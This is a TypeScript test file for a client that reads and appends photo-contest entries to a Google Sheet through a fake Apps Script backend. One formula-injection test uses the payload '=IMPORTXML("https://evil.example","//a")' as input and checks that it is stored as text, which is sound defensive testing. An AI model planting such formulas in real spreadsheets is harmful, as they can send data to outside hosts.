import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { SheetClient, SheetError } from '../src/sheet.ts';
import { HEADERS, startFakeGas, type FakeGas } from './fakeSheet.ts';

/** 既にデータが入っているスプレッドシート（架空のデータ）。右端に利用者独自の列がある */
const EXISTING = [
  [...HEADERS, '審査メモ'],
  ['1', '夜', '風景部門', '星降る夜', 'Example User', '@example', '静かな夜の海を撮影しました。', '2026/09/01', 'https://drive.google.com/file/d/aaa/view', 'https://x.com/example/status/1000000000000000001', '最優秀賞', '', '入選候補'],
  ['2', '夜', 'ポートレート部門', '朝の港', 'Sample Hanako', '@sample_hanako', '', '2026/09/02', '', 'https://twitter.com/sample_hanako/status/1000000000000000002', '', '備考あり', ''],
  ['', '', '', '', '', '', '', '', '', '', '', '', ''],
  ['3', '夜', '風景部門', '手入力の作品', 'Sample Taro', '@sample_taro', '元投稿なし', '', '', '', '', '', ''],
];

let gas: FakeGas;
let client: SheetClient;

before(async () => {
  gas = await startFakeGas(EXISTING);
  client = new SheetClient({ url: gas.url, token: gas.token });
});

after(() => gas.close());

test('setup: 既にデータがあるシートには何も書き込まない', () => {
  assert.deepEqual(gas.sheet.writes, []);
  assert.deepEqual(gas.sheet.cells, EXISTING);
});

test('setup: 空のシートには、指定の順番で見出し行を作る', async () => {
  const empty = await startFakeGas();
  try {
    assert.deepEqual(empty.sheet.cells, [HEADERS]);
    assert.equal(empty.sheet.frozenRows, 1);
    assert.deepEqual(await new SheetClient({ url: empty.url, token: empty.token }).list(), []);
  } finally {
    await empty.close();
  }
});

test('認証: トークンが違えば拒否され、データは返らない', async () => {
  const wrong = new SheetClient({ url: gas.url, token: 'wrong' });
  await assert.rejects(wrong.list(), (error: unknown) => error instanceof SheetError && error.code === 'unauthorized');
  const anonymous = await (await fetch(gas.url)).json();
  assert.deepEqual(anonymous, { ok: true, data: { name: 'label-system-sheet' } }, 'GETではデータを返さない');
});

test('接続先: https のみ、トークン必須', () => {
  assert.throws(() => new SheetClient({ url: 'http://example.com/exec', token: 'x' }), SheetError);
  assert.throws(() => new SheetClient({ url: 'not a url', token: 'x' }), SheetError);
  assert.throws(() => new SheetClient({ url: 'https://script.google.com/macros/s/x/exec', token: '' }), SheetError);
});

test('list: 既存の行を、列の意味ごとに読み取る（空行は飛ばす）', async () => {
  const rows = await client.list();
  assert.deepEqual(rows.map((r) => [r.row, r.no, r.title]), [
    [2, '1', '星降る夜'],
    [3, '2', '朝の港'],
    [5, '3', '手入力の作品'],
  ]);
  assert.deepEqual(rows[0], {
    row: 2,
    no: '1',
    theme: '夜',
    category: '風景部門',
    title: '星降る夜',
    username: 'Example User',
    userid: '@example',
    comment: '静かな夜の海を撮影しました。',
    date: '2026/09/01',
    imageUrl: 'https://drive.google.com/file/d/aaa/view',
    postUrl: 'https://x.com/example/status/1000000000000000001',
    award: '最優秀賞',
    note: '',
  });
  assert.deepEqual(gas.sheet.writes, [], '読み取りではシートを変更しない');
});

test('find: 元投稿URLから登録済みの行を探す（x.com / twitter.com の違いは無視）', async () => {
  assert.equal((await client.find('https://x.com/sample_hanako/status/1000000000000000002'))?.no, '2');
  assert.equal(await client.find('https://x.com/example/status/999'), null);
  assert.equal(await client.find(''), null);
});

test('append: 末尾へ1行追加し、No. を続きから振る。既存の行と独自の列は変更しない', async () => {
  const before = gas.sheet.cells.map((row) => [...row]);
  const result = await client.append([
    {
      theme: '夜',
      category: '風景部門',
      title: '新しい作品',
      username: 'New User',
      userid: '@new_user',
      comment: '1行目\n2行目',
      date: '2026/09/28',
      postUrl: 'https://x.com/new_user/status/1000000000000000009',
    },
  ]);
  assert.equal(result.skipped.length, 0);
  assert.equal(result.added[0].no, '4');
  assert.equal(result.added[0].row, 6);

  assert.deepEqual(gas.sheet.cells.slice(0, 5), before, '既存の行は1セルも変わらない');
  assert.deepEqual(gas.sheet.cells[5], [
    '4', '夜', '風景部門', '新しい作品', 'New User', '@new_user', '1行目\n2行目', '2026/09/28', '',
    'https://x.com/new_user/status/1000000000000000009', '', '', '',
  ]);
  assert.ok(gas.sheet.writes.every((cell) => cell.startsWith('6,')), '書き込みは新しい行だけ');
});

test('append: 同じ投稿は追加せず、登録済みの行を返す', async () => {
  const result = await client.append([
    { title: '重複', postUrl: 'https://twitter.com/example/status/1000000000000000001?s=20' },
    { title: '元投稿なしは何件でも追加できる' },
  ]);
  assert.deepEqual(result.skipped.map((s) => [s.index, s.existing?.no]), [[0, '1']]);
  assert.deepEqual(result.added.map((r) => r.no), ['5']);
});

test('append: 「=」「+」で始まる本文は数式にならない', async () => {
  const { added } = await client.append([{ title: '=IMPORTXML("https://evil.example","//a")', comment: '+1 の気持ち' }]);
  const cells = gas.sheet.cells[added[0].row - 1];
  assert.equal(cells[3], '=IMPORTXML("https://evil.example","//a")');
  assert.equal(cells[6], '+1 の気持ち');
  const reloaded = (await client.list()).find((row) => row.row === added[0].row);
  assert.equal(reloaded?.title, '=IMPORTXML("https://evil.example","//a")');
});

test('append: No. の書式（0埋め・接頭辞）は既存の行に合わせる', async () => {
  const padded = await startFakeGas([HEADERS, ['007', '', '', 'A', '', '', '', '', '', '', '', '']]);
  const prefixed = await startFakeGas([HEADERS, ['PC-041', '', '', 'A', '', '', '', '', '', '', '', '']]);
  const empty = await startFakeGas();
  try {
    const add = async (g: FakeGas) => (await new SheetClient({ url: g.url, token: g.token }).append([{ title: 'B' }])).added[0].no;
    assert.equal(await add(padded), '008');
    assert.equal(padded.sheet.cells[2][0], '008', '0埋めが数値の 8 へ変換されない');
    assert.equal(await add(prefixed), 'PC-042');
    assert.equal(await add(empty), '1');
  } finally {
    await Promise.all([padded.close(), prefixed.close(), empty.close()]);
  }
});

test('見出しの表記ゆれ・列の並び替えに対応し、列が足りない場合は分かりやすいエラーにする', async () => {
  const reordered = await startFakeGas([
    ['タイトル', 'No.', 'テーマ', '部門', 'ユーザ名', 'ユーザＩＤ', 'コメント', '投稿日', '画像URL（Google Drive）', '元投稿 URL (Twitter)', '賞など', '備考'].map((h) =>
      h.replace('ＩＤ', 'ID'),
    ),
    ['並び替えた作品', '1', '', '', 'User', '@user', '', '', '', '', '', ''],
  ]);
  try {
    const rows = await new SheetClient({ url: reordered.url, token: reordered.token }).list();
    assert.deepEqual([rows[0].no, rows[0].title, rows[0].userid], ['1', '並び替えた作品', '@user']);
  } finally {
    await reordered.close();
  }

  await assert.rejects(startFakeGas([['No.', 'タイトル'], ['1', 'A']]), /列「テーマ」が見つかりません/);
});

test('行数の上限を超える場合は行を追加してから書き込む', async () => {
  gas.sheet.maxRows = gas.sheet.getLastRow();
  const { added } = await client.append([{ title: '上限の先' }]);
  assert.equal(added.length, 1);
  assert.ok(gas.sheet.maxRows >= added[0].row);
});

test('通信エラー・想定外の応答・古いスクリプトを分かりやすいエラーにする', async () => {
  const settings = { url: gas.url, token: gas.token };
  const respond = (body: string) => (async () => new Response(body)) as unknown as typeof fetch;
  await assert.rejects(
    new SheetClient(settings, respond('<!DOCTYPE html><html>ログイン</html>')).ping(),
    (error: unknown) => error instanceof SheetError && error.code === 'bad-response',
  );
  await assert.rejects(
    new SheetClient(settings, respond('{"ok":false,"error":{"code":"unknown-action","message":"x"}}')).list(),
    /スクリプトが古い形式です/,
  );
  const down = (async () => {
    throw new Error('getaddrinfo ENOTFOUND');
  }) as unknown as typeof fetch;
  await assert.rejects(
    new SheetClient(settings, down).ping(),
    (error: unknown) => error instanceof SheetError && error.code === 'network',
  );
});
